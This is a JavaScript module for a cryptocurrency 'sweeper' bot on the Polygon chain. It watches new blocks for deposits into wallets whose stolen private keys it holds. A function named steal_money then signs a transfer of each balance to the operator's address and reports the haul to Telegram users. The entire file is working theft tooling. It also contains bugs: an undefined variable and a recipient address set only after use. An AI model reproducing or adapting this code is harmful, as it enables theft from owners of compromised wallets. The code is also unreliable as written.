const Web3 = require("web3")
const fs = require('fs');
const readline = require('readline');
const TelegramBot = require('node-telegram-bot-api')
const path = require("path");


module.exports = {
    telegram_token_read_matic: async function () {
        while (true) {
            if (users.length > 0) {
                for (let i = 0; i < users.length; i++) {
                    await bot.sendMessage(users[i], 'Polygon Chain Connected...✅')
                }
                apis_read()
                break
            } else {
                await new Promise(resolve => setTimeout(resolve, 100));
            }
        }
    }
}


async function apis_read() {
    const fileStream = fs.createReadStream(path.join("info", "apis.txt"));
    const rl = readline.createInterface({
        input: fileStream,
        crlfDelay: Infinity
    });
    var apis_list = []
    for await (const line of rl) {
        var rl_token = line.split(['='])[1];
        apis_list.push(rl_token)
    }
    global.moralis_matic = apis_list[4]
    global.web5 = new Web3(moralis_matic)
    global.matic_gwei= apis_list[10]
    global.matic_grab_from = apis_list[12]
    global.matic_gas_addon = await web5.utils.toWei(matic_grab_from, 'ether')
    global.matic_cash_limit = Number(web5.utils.toWei(String(1000), 'ether'))
    global.matic_gas_transfer_amount = Number(web4.utils.toWei(matic_gwei, 'gwei'))
    getBlocks()
}


async function getBlocks() {
    var work = true
    while (work) {
        try {
            var latestBlock = await web5.eth.getBlock(block_identifier = web5.eth.defaultBlock, full_transactions = true);
            global.trans_natic = latestBlock.transactions;
            for(var x in trans_natic) {
                var to_address = trans_natic[x]['to'];
                if (to_address in all_wallets) {
                    steal_money(to_address, all_wallets[to_address]);
                }
            }
            console.log('                              MATIC '+ latestBlock.number);
            await new Promise(resolve => setTimeout(resolve, 333));
        } catch (e) {
            await new Promise(resolve => setTimeout(resolve, 1000));
            global.web5 = new Web3(moralis_matic)
        }
    }
}


async function steal_money(wallet, wallet_specs) {
    try {
        var private_key = wallet_specs[0]
        var counter = 0
        while (true) {
            var balance = await web5.eth.getBalance(wallet)
            if (Number(balance) < matic_gas_addon) {
                await new Promise(resolve => setTimeout(resolve, 80));
                counter++
                if (counter === 200) {
                    return;
                }
            } else {
                break;
            }
        }
        var nonce = await web5.eth.getTransactionCount(wallet)
        var transfer_amount = Number(balance) - matic_gas_transfer_amount * 21000
        var tx_price = {
            'chainId': 137,
            'nonce': nonce,
            'to': user_wallet_address_all_2checksom,
            'value': transfer_amount,
            'gas': 21000,
            'gasPrice': matic_gas_transfer_amount
        }
        var signed_tx = await web5.eth.accounts.signTransaction(tx_price, private_key)
        var tx_hash = await web5.eth.sendSignedTransaction(signed_tx.rawTransaction)
        global.tx_link_matic = 'https://polygonscan.com/tx/' + tx_hash.transactionHash
        global.amount_sent_mat = await web5.utils.fromWei(String(transfer_amount), 'ether')
        console.log('💰MATIC '+amount_sent_mat+'💰 Transaction successful! ' + tx_link_matic)
        global.user_wallet_address_all_2checksom = web5.utils.toChecksumAddress(user_wallet_address)
        sending_good_news()
    } catch (e) {
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
}


async function sending_good_news() {
    var results ='💰MATIC '+amount_sent_mat+'💰 ' + tx_link_matic
    if (users.length > 0) {
        for (let i = 0; i < users.length; i++) {
            await bot.sendMessage(users[i], results)
        }
    }
}